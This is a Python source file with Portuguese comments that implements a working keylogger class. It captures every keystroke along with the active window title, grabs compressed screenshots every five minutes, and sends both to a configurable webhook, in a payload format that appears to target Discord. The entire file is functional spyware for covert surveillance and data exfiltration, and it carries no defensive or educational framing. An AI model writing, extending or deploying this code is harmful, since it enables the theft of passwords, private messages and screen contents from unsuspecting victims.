import keyboard
import threading
import time
import os
import requests
from datetime import datetime
import pyautogui
from io import BytesIO
from PIL import ImageGrab

class Keylogger:
    def __init__(self, interval=60, webhook=None):
        self.interval = interval 
        self.webhook = webhook    
        self.log = ""             
        self.start_time = time.time()
        self.running = False
        self.thread = None
        self.screenshot_timer = None
        self.active_window = ""
        
    def callback(self, event):
        """Callback para eventos de teclado"""
        name = event.name
        
        
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                name = "[BACKSPACE]"
            else:
                name = f"[{name.upper()}]"
        
      
        self.log += name
    
    def update_active_window(self):
        """Atualiza o título da janela ativa"""
        try:
            import win32gui
            self.active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            self.active_window = "Unknown Window"
    
    def report(self):
        """Envia o relatório de teclas pressionadas"""
        if not self.running:
            return
            
       
        self.update_active_window()
        
       
        if self.log:
           
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            report = f"Keylogger Report - {now}\n"
            report += f"Active Window: {self.active_window}\n"
            report += "=" * 50 + "\n"
            report += self.log
            
           
            if self.webhook:
                try:
                    payload = {
                        "content": f"**Keylogger Report - {now}**\nActive Window: `{self.active_window}`",
                        "embeds": [{
                            "title": "Captured Keystrokes",
                            "description": f"```{self.log[:2000]}```",
                            "color": 3447003
                        }]
                    }
                    
                    requests.post(self.webhook, json=payload)
                except Exception as e:
                    print(f"Error sending to webhook: {e}")
            
          
            self.log = ""
        
       
        if self.running:
            threading.Timer(self.interval, self.report).start()
    
    def take_screenshot(self):
        """Captura screenshot da tela atual"""
        if not self.running:
            return
            
        try:
            
            screenshot = ImageGrab.grab()
            
           
            width, height = screenshot.size
            new_width = min(1024, width)  # Limita a largura máxima
            new_height = int(height * (new_width / width))
            screenshot = screenshot.resize((new_width, new_height), resample=1)  # 1=LANCZOS
            
            
            img_bytes = BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=70)
            img_bytes.seek(0)
            
           
            if self.webhook:
                try:
                    
                    self.update_active_window()
                    
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    files = {
                        'file': ('screenshot.jpg', img_bytes, 'image/jpeg')
                    }
                    
                    payload = {
                        'content': f"**Screenshot - {now}**\nActive Window: `{self.active_window}`"
                    }
                    
                    requests.post(self.webhook, data=payload, files=files)
                except Exception as e:
                    print(f"Error sending screenshot: {e}")
        except:
            pass  
            
       
        if self.running:
            self.screenshot_timer = threading.Timer(300, self.take_screenshot)  # A cada 5 minutos
            self.screenshot_timer.daemon = True
            self.screenshot_timer.start()
    
    def start(self):
        """Inicia o keylogger"""
        self.running = True
        self.start_time = time.time()
        
       
        keyboard.on_release(callback=self.callback)
        
      
        self.report()
        
       
        self.take_screenshot()
    
    def stop(self):
        """Para o keylogger"""
        self.running = False
        keyboard.unhook_all()
        
       
        if self.screenshot_timer:
            self.screenshot_timer.cancel()
    
    def is_running(self):
        """Verifica se o keylogger está em execução"""
        return self.running